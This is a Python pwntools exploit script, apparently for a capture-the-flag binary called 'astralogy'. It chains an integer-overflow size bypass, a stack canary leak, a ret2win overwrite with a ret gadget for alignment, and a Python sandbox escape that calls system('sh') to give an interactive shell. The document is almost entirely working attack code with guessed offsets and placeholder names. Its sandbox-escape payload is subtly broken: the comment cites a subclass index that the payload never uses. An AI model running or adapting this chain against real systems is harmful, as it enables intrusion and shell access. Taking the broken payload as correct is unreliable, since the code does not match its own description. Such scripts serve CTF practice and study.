from pwn import *

# 1. Initialize the environment
# This automatically sets the architecture, OS, and endianness based on the binary
exe = context.binary = ELF('./astralogy')

# Change to process() for local testing, or remote() for the live CTF server
io = process() 
# io = remote('target_ip', 1337) 

# =========================================================================
# Phase 1: Bypass Buffer Allocation Constraint via Integer Overflow
# =========================================================================
# The application likely asks for a size. We send -1 to bypass the signed 
# integer check, which implicitly casts to a massive unsigned size_t.
log.info("Sending integer overflow to bypass size restrictions...")
io.sendlineafter(b"size", b"-1") # Adjust the delimiter to match the binary's prompt

# =========================================================================
# Phase 2 & 3: Stack Canary Leak
# =========================================================================
# Assuming you use an unterminated string over-read to bleed the canary.
# You will need to write exactly up to the canary's null byte first.
# (This step might vary slightly depending on if it's a format string or over-read)

# Wait for the application to output the leaked memory
io.recvuntil(b"delimiter_before_canary") 

# Capture the 7 bytes of the canary, add the null byte back, and unpack it
raw_canary = io.recv(7)
canary = u64(raw_canary.rjust(8, b'\x00'))
log.success(f"Successfully leaked Stack Canary: {hex(canary)}")

# =========================================================================
# Phase 4: Control Flow Hijacking (Ret2Win with MOVAPS Alignment)
# =========================================================================
# Calculate your padding up to the canary (replace 64 with your GDB offset)
offset_to_canary = 64
padding = b"A" * offset_to_canary

# We need 8 bytes of junk to overwrite the saved Base Pointer (RBP)
saved_rbp = b"B" * 8

# Grab a simple 'ret' instruction gadget to align the stack to 16 bytes for MOVAPS
rop = ROP(exe)
ret_gadget = p64(rop.find_gadget(['ret']))

# Resolve the address of the dormant "win" function directly from the binary
win_function = p64(exe.sym['win_function']) # Replace 'win_function' with the actual function name

# Assemble the final Return-Oriented Programming payload
payload = padding + p64(canary) + saved_rbp + ret_gadget + win_function

log.info("Sending Ret2Win payload with repacked canary and stack alignment...")
io.sendline(payload)

# =========================================================================
# Phase 5: Python Sandbox (PyJail) Escape
# =========================================================================
# The "win" function drops us into a restricted Python environment.
# We use object inheritance traversal to escape the sandbox and spawn a shell.
# Note: You must find the exact index of the target subclass (e.g., os._wrap_close). 
# I am using 132 here as a placeholder index.

pyjail_escape_payload = b"\"\".__class__.__mro__[-1].__subclasses__().__init__.__globals__['system']('sh')"

log.info("Injecting PyJail escape sequence...")
# It may take a moment for the Python environment to spawn and accept input
io.sendlineafter(b">>>", pyjail_escape_payload) 

# =========================================================================
# Phase 6: Interactive Shell
# =========================================================================
# Drop control back to the user to interact with the newly spawned shell
log.success("Exploit chain complete. Dropping to interactive shell!")
io.interactive()